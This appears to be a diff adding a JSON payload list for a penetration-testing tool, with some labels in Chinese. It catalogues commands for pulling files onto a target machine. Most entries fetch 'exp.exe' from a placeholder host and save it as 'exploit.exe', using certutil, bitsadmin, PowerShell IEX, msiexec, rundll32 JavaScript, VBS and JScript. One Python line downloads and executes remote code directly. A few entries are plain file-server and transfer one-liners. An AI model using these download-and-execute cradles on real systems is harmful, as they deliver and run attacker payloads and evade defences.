@@ -1,0 +1,216 @@
+[
+  {
+    "name": "Python Download",
+    "command": "python -c \"import urllib2; exec urllib2.urlopen('http://8.8.8.8/exp1.exe').read();\"",
+    "meta": [
+      "All"
+    ]
+  },
+  {
+    "name": "Python2 HTTP Server",
+    "command": "python -m SimpleHTTPServer 8888",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Python3 HTTP Server",
+    "command": "python3 -m http.server 8888",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Python FTP Server",
+    "command": "python -m pyftpdlib -p 8888",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Python3 SMB",
+    "command": "python3 impacket-smbserver.py files . -port 8888",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "PHP 5.4+",
+    "command": "php -S 0.0.0.0:8888",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Ruby HTTP Server1",
+    "command": "ruby -run -e httpd . -p 8888",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Ruby HTTP Server2",
+    "command": "ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start'",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Perl HTTP Server1",
+    "command": "perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8888); $s->mount(\"/\"=>{path=>\".\"}); $s->start'",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Perl HTTP Server2",
+    "command": "perl -MIO::All -e 'io(\":8888\")->fork->accept->(sub { $_[0] < io(-x $1 +? \"./$1 |\" : $1) if /^GET /(.*) / })'",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "busybox httpd",
+    "command": "busybox httpd -f -p 8888",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "NC下载",
+    "command": "cat test.txt | nc -l 1234\n  nc 192.168.1.100 1234 > test.txt",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "TFTP",
+    "command": "tftp -i host GET C:%homepath%file location_of_file_on_tftp_server",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux wget",
+    "command": "wget http://8.8.8.8/exp.exe -O exploit.exe",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux curl",
+    "command": "curl http://8.8.8.8/exp.exe -o exploit.exe",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "SCP下载",
+    "command": "本地到远程: scp file user@host.com:/tmp\n  远程到本地: scp user@host.com:/tmp file",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Rsync",
+    "command": "远程rsync服务器中拷贝文件到本地机: rsync -av root@192.168.1.1::www /databack \n本地机器拷贝文件到远程rsync服务器: rsync -av /databack root@192.168.1.1::www",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "PowerShell - IWR(Windows)",
+    "command": "powershell.exe -Command \"Invoke-WebRequest -Uri http://8.8.8.8/exp.exe -OutFile exploit.exe\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "PowerShell - IEX(Windows)",
+    "command": "powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadFile('http://8.8.8.8/exp.exe', exploit.exe)\"",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows Certutil",
+    "command": "certutil.exe -urlcache -split -f http://8.8.8.8/exp.exe exploit.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows Bitsadmin Down",
+    "command": "bitsadmin /rawreturn /transfer down \"http://8.8.8.8/exp.exe\" c:\\exploit.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows Bitsadmin Getfile",
+    "command": "bitsadmin /rawreturn /transfer getfile \"http://8.8.8.8/exp.exe\" c:\\exploit.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows msiexec",
+    "command": "msiexec /q /i http://8.8.8.8/exp.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows IPC$",
+    "command": "copy \\8.8.8.8\\c$\\ms10-051.exe C:\\exploit.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows SMB",
+    "command": "copy \\8.8.8.8\\files\\ms10-051.exe exploit.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Windows VBS",
+    "command": "新建文件'iget.vbs'，内容如下：\n  iLocal=LCase(Wscript.Arguments(1))\n  iRemote=LCase(Wscript.Arguments(0))\n  Set xPost=createObject(\"Microsoft.XMLHTTP\")\n  xPost.Open \"GET\",iRemote,0\n  xPost.Send()\n  set sGet=createObject(\"ADODB.Stream\")\n  sGet.Mode=3\n  sGet.Type=1\n  sGet.Open()\n  sGet.Write xPost.ResponseBody\n  sGet.SaveToFile iLocal,2\n\n  之后执行：cscript //nologo iget.vbs http://8.8.8.8/exp.exe c:\\exploit.exe",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "JScript",
+    "command": "varObject = WScript.CreateObject(\"MSXML2.XMLHTTP\");Object.open(\"GET\",\"http://8.8.8.8/exp.exe\",false);Object.send();if(Object.Status == 200){varStream = WScript.CreateObject(\"ADODB.Stream\");Stream.Open();Stream.Type = 1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(\"c:\\exploit.exe\", 2);Stream.Close();}",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "JScript+Rundll32",
+    "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();Object=new%20ActiveXObject(\"Microsoft.XMLHTTP\");Object.open(\"GET\",\"http://8.8.8.8/exp.exe\",false);Object.send();if(Object.Status==200){Stream=new%20ActiveXObject(\"ADODB.Stream\");Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(\"c:\\exploit.exe\",2);Stream.Close();}",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Window文件共享",
+    "command": "net use x: \\8.8.8.8\\share /user:example.comuserID myPassword",
+    "meta": [
+      "windows"
+    ]
+  }
+]
